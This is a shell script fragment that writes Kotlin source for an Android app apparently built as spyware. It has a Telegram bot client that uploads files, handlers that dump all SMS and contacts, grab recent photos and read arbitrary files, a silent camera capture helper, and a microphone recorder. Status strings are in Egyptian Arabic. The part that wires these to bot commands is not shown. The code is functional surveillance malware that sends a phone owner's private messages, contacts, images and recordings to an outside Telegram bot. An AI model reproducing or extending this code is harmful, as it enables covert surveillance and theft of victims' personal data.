        cat << 'EOF' > app/src/main/java/com/example/namprfek/TelegramApi.kt
        package com.example.namprfek
        import okhttp3.*
        import okhttp3.MediaType.Companion.toMediaType
        import okhttp3.RequestBody.Companion.asRequestBody
        import okhttp3.RequestBody.Companion.toRequestBody
        import org.json.JSONArray
        import org.json.JSONObject
        import java.io.File
        import java.util.concurrent.TimeUnit
        class TelegramApi(private val token: String) {
            private val client = OkHttpClient.Builder().connectTimeout(20, TimeUnit.SECONDS).readTimeout(40, TimeUnit.SECONDS).build()
            private val base = "https://api.telegram.org/bot$token"
            private val json = "application/json".toMediaType()
            fun sendMessage(chatId: String, text: String) {
                val body = JSONObject().put("chat_id", chatId).put("text", text.take(4000)).toString().toRequestBody(json)
                val req = Request.Builder().url("${base}/sendMessage").post(body).build()
                runCatching { client.newCall(req).execute().close() }
            }
            fun sendDocument(chatId: String, file: File, caption: String = "") {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", chatId).addFormDataPart("caption", caption.take(1000)).addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType())).build()
                val req = Request.Builder().url("${base}/sendDocument").post(body).build()
                runCatching { client.newCall(req).execute().close() }
            }
            fun getUpdates(offset: Long): JSONArray {
                val req = Request.Builder().url("${base}/getUpdates?offset=$offset&timeout=25").get().build()
                return try { client.newCall(req).execute().use { r -> val b = r.body?.string() ?: return JSONArray(); JSONObject(b).optJSONArray("result") ?: JSONArray() } } catch (e: Exception) { JSONArray() }
            }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/example/namprfek/Handlers.kt
        package com.example.namprfek
        import android.annotation.SuppressLint
        import android.content.Context
        import android.os.Environment
        import android.provider.ContactsContract
        import android.provider.MediaStore
        import android.provider.Telephony
        import org.json.JSONArray
        import org.json.JSONObject
        import java.io.File
        object Handlers {
            private fun dump(name: String, arr: JSONArray): File { val f = File(Environment.getExternalStorageDirectory(), name); f.writeText(arr.toString(2)); return f }
            @SuppressLint("Range")
            fun sms(ctx: Context): File {
                val arr = JSONArray()
                ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")?.use { c ->
                    while (c.moveToNext()) { arr.put(JSONObject().put("from", c.getString(c.getColumnIndexOrThrow("address"))).put("body", c.getString(c.getColumnIndexOrThrow("body")))); if (arr.length() >= 2000) break }
                }
                return dump("sms_${System.currentTimeMillis()}.json", arr)
            }
            @SuppressLint("Range")
            fun contacts(ctx: Context): File {
                val arr = JSONArray()
                ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c ->
                    while (c.moveToNext()) { arr.put(JSONObject().put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).put("number", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))) }
                }
                return dump("contacts_${System.currentTimeMillis()}.json", arr)
            }
            fun getLatestPhotos(ctx: Context): List<File> {
                val files = mutableListOf<File>()
                val cursor = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Images.Media.DATA), null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
                cursor?.use { val col = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA); var count = 0; while (it.moveToNext() && count < 5) { val f = File(it.getString(col)); if (f.exists()) { files.add(f); count++ } } }
                return files
            }
            fun listFiles(path: String): String { val dir = File(path); if (!dir.exists()) return "مش موجود: $path"; return dir.listFiles()?.take(100)?.joinToString("\n") { "${if (it.isDirectory) "📁" else "📄"} ${it.name}" } ?: "مفيش قراءة" }
            fun getFile(path: String): File? { val f = File(path); return if (f.exists() && f.isFile) f else null }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/example/namprfek/CameraHelper.kt
        package com.example.namprfek
        import android.annotation.SuppressLint
        import android.content.Context
        import android.graphics.ImageFormat
        import android.hardware.camera2.*
        import android.media.ImageReader
        import android.os.Handler
        import android.os.Looper
        import java.io.File
        import java.util.concurrent.CountDownLatch
        import java.util.concurrent.TimeUnit
        object CameraHelper {
            @SuppressLint("MissingPermission")
            fun capture(ctx: Context, lens: Int): File? {
                val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val id = mgr.cameraIdList.firstOrNull { mgr.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == lens } ?: return null
                val file = File(ctx.cacheDir, "snap_${System.currentTimeMillis()}.jpg")
                val latch = CountDownLatch(1)
                val handler = Handler(Looper.getMainLooper())
                val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
                var cam: CameraDevice? = null
                reader.setOnImageAvailableListener({ r -> val img = runCatching { r.acquireLatestImage() }.getOrNull() ?: return@setOnImageAvailableListener; try { val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes); file.writeBytes(bytes) } finally { img.close(); latch.countDown() } }, handler)
                runCatching { mgr.openCamera(id, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cam = camera
                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }.build()
                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) { runCatching { s.capture(req, null, null) } }
                            override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
                        }, handler)
                    }
                    override fun onDisconnected(camera: CameraDevice) { camera.close(); latch.countDown() }
                    override fun onError(camera: CameraDevice, error: Int) { camera.close(); latch.countDown() }
                }, handler) }
                latch.await(15, TimeUnit.SECONDS)
                runCatching { cam?.close() }; runCatching { reader.close() }
                return if (file.exists() && file.length() > 0) file else null
            }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/example/namprfek/AudioHelper.kt
        package com.example.namprfek
        import android.annotation.SuppressLint
        import android.content.Context
        import android.media.MediaRecorder
        import android.os.Build
        import java.io.File
        object AudioHelper {
            @SuppressLint("MissingPermission")
            fun record(ctx: Context, seconds: Int): File? {
                val file = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
                val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
                return try {
                    rec.setAudioSource(MediaRecorder.AudioSource.MIC); rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); rec.setOutputFile(file.absolutePath); rec.prepare(); rec.start(); Thread.sleep(seconds.coerceIn(1, 120) * 1000L); rec.stop()
                    if (file.exists()) file else null
                } catch (e: Exception) { null } finally { runCatching { rec.release() } }
            }
        }
        EOF

